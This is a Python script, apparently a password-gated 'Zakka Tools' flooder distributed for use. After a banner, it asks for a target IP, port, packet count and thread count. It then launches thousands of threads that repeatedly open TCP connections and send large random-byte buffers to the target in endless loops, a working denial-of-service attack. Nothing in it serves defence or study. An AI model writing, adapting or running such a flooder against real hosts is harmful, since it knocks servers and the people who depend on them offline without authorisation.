import random
import socket
import threading
import os, sys
import requests
import time
import logging
import sysconfig
import colorsys

os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Zakka Frezze Tools")
password = input("[+]What Is The Password:")
if password == 'levistore2021':
        print("[+]Access Granted")
        time.sleep(2)
else :
	print("[X]Wrong Password")
	time.sleep(100000000000000000000000000000)

os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Zakka Tools")
print("")
print("███████╗░█████╗░██╗░░██╗██╗░░██╗░█████╗░") 
print("╚════██║██╔══██╗██║░██╔╝██║░██╔╝██╔══██╗") 
print("░░███╔═╝███████║█████═╝░█████═╝░███████║") 
print("██╔══╝░░██╔══██║██╔═██╗░██╔═██╗░██╔══██║") 
print("███████╗██║░░██║██║░╚██╗██║░╚██╗██║░░██║") 
print("╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝") 
print("----------------------------------")
print("     [+]Tools Used By : Zakka")
print("     [+]Credit By : Zakka")
print("     [+]Credit Jangan diapus gblk")
print("----------------------------------")
ip = str(input("[/] IP-Target          : "))
port = int(input("[/] Enter The Port (3389) : "))
times = int(input("[/] Packets (30000) : "))
threads = int(input("[/] Thread (9024) : "))

def run():
    data = random._urandom(65535)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[*] Zakka Tools | Launch Attack | Attacking Server | Send")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
